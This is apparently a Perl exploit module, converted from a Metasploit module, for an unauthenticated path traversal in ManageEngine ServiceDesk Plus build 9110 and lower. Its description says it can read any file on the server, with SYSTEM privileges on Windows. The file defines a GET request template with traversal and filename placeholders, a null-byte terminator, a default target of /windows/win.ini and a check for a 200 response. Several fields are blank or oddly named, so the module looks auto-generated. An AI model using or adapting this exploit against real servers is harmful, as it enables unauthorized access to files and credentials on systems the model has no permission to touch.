package SERVICEDESK::MSF::ServicedeskPlusTraversal;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "ServicedeskPlusTraversal";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION => "

        This module exploits an unauthenticated path traversal vulnerability found in ManageEngine

        ServiceDesk Plus build 9110 and lower. The module will retrieve any file on the filesystem

        with the same privileges as Support Center Plus is running. On Windows, files can be retrieved

        with SYSTEM privileges. The issue has been resolved in ServiceDesk Plus build 91111 (issue SD-60283).

      ",
  METHOD => "GET",
  MSF_MODULE => "servicedesk_plus_traversal",
  PATH => "module=support&fName=__TRAVERSAL____FILENAME__\\x00&=____&",
  PATHS => [""],
  REFERENCES => [
    "https://www.manageengine.com/products/service-desk/readme-9.1.html",
  ],
  VARIABLES => {
    'FILENAME' =>       { DESCRIPTION => "", VALUE => "" },
    'TRAVERSAL' =>       { DESCRIPTION => "", VALUE => "" },
    'PATH' =>       {
  DESCRIPTION => "The base path to the ServiceDesk Plus installation",
  VALUE => "/",
},
    '' =>       { DESCRIPTION => "", VALUE => "" },
    'FILE' =>       { DESCRIPTION => "The file to retrieve", VALUE => "/windows/win.ini" },
  },

  TYPE => 'MSF',
  PLATFORM => 'SCANNER',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
